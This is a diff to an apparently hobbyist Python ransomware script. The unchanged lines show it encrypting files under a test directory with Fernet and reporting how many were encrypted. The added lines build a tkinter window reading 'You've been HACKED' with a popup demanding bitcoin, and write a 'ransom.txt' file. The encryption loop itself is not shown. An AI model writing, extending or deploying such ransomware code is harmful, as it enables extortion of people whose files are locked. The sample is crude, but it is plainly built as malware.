@@ -1,6 +1,9 @@
 import os
 import time
 from cryptography.fernet import Fernet
+from tkinter import *
+from tkinter import ttk
+from pathlib import Path
 
 #import pathlib
 #drive = pathlib.Path.home().drive
@@ -56,3 +59,22 @@ for root, dirs, files in os.walk(r"./TestDirectories", topdown=False):
 endTime = time.time()
 execTime = endTime-startTime
 print(f'{fileCounter}, file(s) have been encrypted in, {execTime} seconds')
+
+
+win = Tk()
+win.geometry("750x270")
+
+def open_popup():
+   top= Toplevel(win)
+   top.geometry("750x250")
+   top.title("Bitcoin address")
+   Label(top, text= "Please send bitcoin to the address below.", font=('Mistral 18 bold')).place(x=150,y=80)
+
+Label(win, text=" You've been HACKED. Press button below to see message.", font=('Helvetica 14 bold')).pack(pady=20)
+#Create a button in the main Window to open the popup
+ttk.Button(win, text= "Open", command= open_popup).pack()
+win.mainloop()
+
+f = open("ransom.txt", "w+")
+f.write("Ransom, Ransom")
+f.close()
